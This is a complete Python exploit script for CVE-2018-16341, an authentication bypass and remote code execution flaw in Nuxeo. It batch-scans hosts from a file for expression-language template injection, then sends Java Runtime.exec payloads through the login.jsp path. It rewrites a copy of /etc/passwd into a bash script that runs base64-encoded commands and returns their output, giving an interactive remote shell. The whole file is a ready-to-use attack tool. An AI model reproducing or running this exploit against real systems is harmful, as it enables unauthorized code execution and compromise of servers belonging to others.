from requests.packages.urllib3.exceptions import InsecureRequestWarning
import urllib3
import requests
import base64
import json
import sys
import re
from colorama import Fore, Style, init

init()

banner = ("""
       ______ _          ______ _   _  _____  
       | ___ \\ |         | ___ \\ | | ||  _  | 
       | |_/ / |__  _   _| |_/ / | | || |_| | 
       |    /| '_ \\| | | |    /| | | |\\____ | 
       | |\\ \\| | | | |_| | |\\ \\| |_| |.___/ / 
       \\_| \\_|_| |_|\\__, \\_| \\_\\___/ \\____(_)
                     __/ |                    
                    |___/                     
""")

print(Fore.CYAN + banner + Style.RESET_ALL)
print(Fore.GREEN + "Nuxeo Authentication Bypass Remote Code Execution - CVE-2018-16341" + Style.RESET_ALL + "\n")

proxy = {}

ARCH = "UNIX"

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def checkSuccess(r):
    if r.status_code == 200:
        m = re.search('login.jsp/pwn(.+?).xhtml', r.text)
        if m:
            if int(m.group(1)) == 0:
                print(Fore.GREEN + "OK" + Style.RESET_ALL)
        else:
            print("\n[-]" + Fore.RED + " Error" + Style.RESET_ALL)
            return True
    else:
        print("[-]" + Fore.RED + " Error status code" + Style.RESET_ALL, r.status_code)
        return True
    return False


def execute_command(remote, command):
    print("[+]" + Fore.CYAN + " Executing command =>" + Style.RESET_ALL, end=' ')
    request1 = remote + '/nuxeo/login.jsp/pwn${"".getClass().forName("java.io.BufferedReader").getDeclaredMethod("readLine").invoke("".getClass().forName("java.io.BufferedReader").getConstructor("".getClass().forName("java.io.Reader")).newInstance("".getClass().forName("java.io.InputStreamReader").getConstructor("".getClass().forName("java.io.InputStream")).newInstance("".getClass().forName("java.lang.Process").getDeclaredMethod("getInputStream").invoke("".getClass().forName("java.lang.Runtime").getDeclaredMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null),"' + command + '")))))}.xhtml'
    try:
        r = requests.get(request1, proxies=proxy,
                         verify=False, allow_redirects=False)
        if r.status_code == 200:
            m = re.search('login.jsp/pwn(.+?).xhtml', r.text)
            if m:
                print(Fore.GREEN + m.group(1) + Style.RESET_ALL)
                print('')
            else:
                print(Fore.RED + "KO" + Style.RESET_ALL)
                return True
        else:
            print(Fore.RED + "KO" + Style.RESET_ALL)
            return True
    except Exception as e:
        print(Fore.RED + "KO (Connection Error)" + Style.RESET_ALL)
        print(e)
        return True
    return False


def process_remote(remote):
    print("[+]" + Fore.CYAN + " Checking template injection vulnerability for:" + Style.RESET_ALL, remote)
    request1 = remote + "/nuxeo/login.jsp/pwn${-7+7}.xhtml"
    try:
        r = requests.get(request1, proxies=proxy, verify=False, allow_redirects=False)
        if r.status_code == 301 or r.status_code == 302:
            print("[-]" + Fore.RED + " Redirection occurred. Following redirect to:" + Style.RESET_ALL, r.headers['Location'])
            r = requests.get(r.headers['Location'], proxies=proxy, verify=False, allow_redirects=False)
        elif r.status_code == 404:
            print("[-]" + Fore.RED + " Error: Template injection vulnerability check failed. HTTP 404 - Not Found" + Style.RESET_ALL)
            return
        if checkSuccess(r):
            return

        print("")
        while True:
            try:
                if ARCH == "UNIX":
                    command = input("command (" + Fore.GREEN + ARCH + Style.RESET_ALL + ")> ")
                    command += '>command.txt'
                    command = base64.b64encode(command.encode('utf-8'))
                    command_str = command.decode('utf-8')
                    command_str = command_str.replace('/', '+')

                    if execute_command(remote, 'cp%20/etc/passwd%20/tmp/passwd'):
                        break

                    if execute_command(remote, 'sed%20-i%201cpwn%20/tmp/passwd'):
                        break

                    if execute_command(remote, 'sed%20-i%20/[^pwn]/d%20/tmp/passwd'):
                        break

                    if execute_command(remote, 'sed%20-i%201s/pwn/{echo,' + command_str + '}|{base64,-d}>pwn.txt/g%20/tmp/passwd'):
                        break

                    if execute_command(remote, 'bash%20/tmp/passwd'):
                        break

                    if execute_command(remote, 'bash%20pwn.txt'):
                        break

                    print("[+]" + Fore.CYAN + " Getting command result =>" + Style.RESET_ALL + "\n")
                    burp0_url = remote + '/nuxeo/login.jsp/pwn${"".getClass().forName("java.io.BufferedReader").getDeclaredMethod("readLine").invoke("".getClass().forName("java.io.BufferedReader").getConstructor("".getClass().forName("java.io.Reader")).newInstance("".getClass().forName("java.io.InputStreamReader").getConstructor("".getClass().forName("java.io.InputStream")).newInstance("".getClass().forName("java.lang.Process").getDeclaredMethod("getInputStream").invoke("".getClass().forName("java.lang.Runtime").getDeclaredMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null),"base64%20-w%200%20command.txt")))))}.xhtml'
                    r = requests.get(burp0_url, proxies=proxy,
                                     verify=False, allow_redirects=False)
                    if r.status_code == 200:
                        m = re.search('login.jsp/pwn(.+?).xhtml', r.text)
                        if m:
                            print(base64.b64decode(m.group(1)).decode('utf-8'))
                        else:
                            print("\n[-]" + Fore.RED + " Error" + Style.RESET_ALL)
                    else:
                        print("[-]" + Fore.RED + " Error status code" + Style.RESET_ALL, r.status_code)
                        break
                else:
                    command = input("command (" + Fore.CYAN + ARCH + Style.RESET_ALL + ")> ")
                    print('')
                    print("[+]" + Fore.CYAN + " Executing command =>" + Style.RESET_ALL + "\n")
                    if execute_command(remote, command):
                        break

            except KeyboardInterrupt:
                print("Exiting...")
                break
    except Exception as e:
        print("[-]" + Fore.RED + " Error:" + Style.RESET_ALL, e)


with open('file.txt', 'r') as file:
    remotes = file.readlines()
    for remote in remotes:
        remote = remote.strip()
        process_remote(remote)
